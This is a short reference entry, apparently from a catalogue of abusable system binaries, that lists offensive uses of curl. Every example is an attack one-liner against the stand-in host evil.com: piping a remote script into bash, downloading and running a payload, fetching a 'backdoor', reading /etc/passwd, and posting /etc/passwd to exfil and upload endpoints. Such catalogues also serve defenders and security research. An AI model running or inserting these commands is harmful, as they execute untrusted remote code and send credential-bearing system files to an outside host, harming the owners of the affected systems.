---
title: curl
tags: [file-read, file-write, execution]
description: Command line tool for transferring data with URLs, can be used to download/upload files and execute remote scripts.
exec: |
  # Execute remote script
  curl -s https://evil.com/script.sh | bash
  
  # Download and execute
  curl -o /tmp/payload https://evil.com/payload && chmod +x /tmp/payload && /tmp/payload
file-read: |
  # Read local files via file:// protocol
  curl file:///etc/passwd
  
  # Read files and send to remote server
  curl -X POST -d @/etc/passwd https://evil.com/exfil
file-write: |
  # Download file to specific location
  curl https://evil.com/backdoor -o /tmp/backdoor
  
  # Upload file to remote server
  curl -X POST -F "file=@/etc/passwd" https://evil.com/upload
layout: binary
---
